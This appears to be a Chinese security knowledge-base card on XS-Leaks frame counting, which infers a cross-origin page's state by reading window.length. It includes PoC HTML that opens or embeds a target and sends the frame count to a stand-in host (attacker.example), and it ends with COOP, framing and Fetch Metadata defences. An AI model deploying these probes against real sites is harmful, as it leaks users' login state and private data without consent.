---
id: web-generic-xs-leaks-window-length-frame-counting
title: XS-Leaks 帧计数：读取跨域窗口 window.length 推断页面状态
type: scenario
domain: web
path: web/generic/xs-leaks
technique: xs-leaks-window-length-frame-counting
aliases:
- 帧计数
- frame counting
- window.length oracle
- win.frames.length
- 窗口引用侧信道
tags:
- web
- xs-leaks
- side-channel
- frame-counting
- window-length
- iframe
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V218
  verified_at: '2026-11-07T04:52:18+08:00'
  notes: 已对照原文核对：window.open后读取win.frames.length、iframe contentWindow.length变体、COOP防御均一致；未复跑。dup-scan均为related，保留。
---

## 一句话结论

跨域窗口的 `window.length`（即 `window.frames.length`）不受同源策略保护；攻击页用 `window.open` 打开目标页后读取该值，若目标页在不同状态下嵌入不同数量的 iframe/embed/object，就能把“子框架数量”当作布尔或枚举 oracle，推断受害者的登录态、权限或页面数据。

## 原理

- `window.length` 返回当前窗口直接子级浏览上下文（iframe、frame、object、embed 等）的数量。它与 `window.frames` 一样属于跨源可读的 WindowProxy 属性：同源策略不允许读取跨域窗口的 DOM，但允许读取 `length`、`frames`、`closed`、`top`、`parent` 等有限属性。
- 许多页面会根据业务状态渲染不同数量的框架：登录后多一个 iframe 广告位、某权限下多一个嵌入的统计/支付组件、某条数据存在时多一个预览 iframe。攻击者只需比较状态 A/B 下的 `length` 差异。
- 攻击页打开目标窗口后，可以轮询读取 `win.frames.length`，直到值稳定；也可以把目标页嵌入 iframe，读取 `iframe.contentWindow.length`。两种方式都只依赖“窗口引用”，不需要读取页面内容。
- 该 oracle 不需要目标站存在 XSS 或 CSS 注入，也不需要目标返回特殊状态码；只要页面框架数量可控且随状态变化，就能泄露信息。文章引用的 Facebook 隐私漏洞即通过 iframe 数量差异推断用户信息。

## 触发条件

- 目标页面允许被 `window.open` 打开或被 iframe 嵌入，且没有 `Cross-Origin-Opener-Policy: same-origin`（COOP 会切断 opener 引用，使 `window.open` 返回值不可用）。
- 目标页在不同业务状态下 iframe/embed/object 数量不同，且差异稳定可观察。
- 攻击页可执行脚本并能打开/嵌入目标；弹窗拦截策略允许该操作（通常需要用户手势触发 `window.open`）。
- 目标未通过 `X-Frame-Options`/`frame-ancestors` 阻止 iframe 嵌入（使用 `window.open` 方式时不受此限，但受 COOP 限制）。

## 利用步骤

1. 观察目标页在两种状态（登录/未登录、有权限/无权限、数据存在/不存在）下的 iframe 数量差异。
2. 在攻击页用 `window.open(targetUrl)` 打开目标窗口；若被拦截，用一次用户点击触发。
3. 等待页面加载完成后读取 `win.length` 或 `win.frames.length`，与基准值比较。
4. 把比较结果回传；对多状态场景可枚举不同页面或不同参数，构建更细的 oracle。

## PoC

```html
<button onclick="probe()">开始</button>
<script>
  function probe() {
    var win = window.open('http://localhost:5555');
    setTimeout(function () {
      var n = win.frames.length; // 跨域可读
      new Image().src = 'https://attacker.example/leak?frames=' + n;
    }, 1000);
  }
</script>
```

说明：若目标页含 1 个 iframe，读到的值为 1；不含则为 0。实际利用时先测出不同业务状态下的基准帧数，再把读数映射为状态。文章示例直接用 `alert(win.frames.length)` 观察结果。

iframe 变体：

```html
<iframe id="f" src="http://localhost:5555"></iframe>
<script>
  setTimeout(function () {
    var n = document.getElementById('f').contentWindow.length;
    new Image().src = 'https://attacker.example/leak?frames=' + n;
  }, 1000);
</script>
```

## 变体与关联

- 变体：比较 `window.length` 的精确值、是否为 0、或在一段时间内是否变化，适配不同页面。
- 变体：结合 `window.open` 后对目标页执行 `postMessage` 或导航到不同参数，逐一探测状态。
- 关联：[[web-generic-xs-leaks-css-pattern-valid-frame-counting-token]]（把帧计数作为 CSS `pattern:valid` 盲注的 oracle，用于逐字符窃取 Token；本卡是无需注入点的独立帧计数探测）。
- 关联：[[web-generic-xs-leaks-img-onload-onerror-login-detect]]（另一种跨站状态 oracle）。
- 边界：目标设置 `Cross-Origin-Opener-Policy: same-origin` 时 `window.open` 的返回值被切断；iframe 方式受 `X-Frame-Options`/`frame-ancestors` 限制；目标各状态帧数一致时不成立。

## 检测与防御

- 检测：目标页被跨站窗口打开/嵌入后短时间内被读取 `window.length` 的行为无法直接在后端看到，但可结合 `Sec-Fetch-Dest: iframe`、`Sec-Fetch-Site: cross-site`、异常来源的页面加载与高频探测请求识别。
- 防御：设置 `Cross-Origin-Opener-Policy: same-origin`（切断 opener 引用）；对不允许嵌入的页面设置 `X-Frame-Options: DENY` 与 CSP `frame-ancestors 'none'`。
- 加固：避免用 iframe/embed 数量表达业务状态，统一各状态下的框架结构；对敏感页面禁用跨站框架化，并用 Fetch Metadata 拒绝跨站 iframe 请求。
